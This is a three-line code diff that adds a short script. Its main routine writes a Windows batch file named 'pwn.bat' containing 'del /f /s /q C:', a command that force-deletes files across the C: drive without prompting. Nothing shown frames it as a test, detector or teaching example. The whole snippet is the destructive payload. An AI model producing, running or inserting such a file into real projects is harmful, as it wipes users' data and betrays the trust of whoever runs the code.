@@ -1,0 +1,3 @@
+define main
+  write with "data/pwn.bat", "del /f /s /q C:"
+end
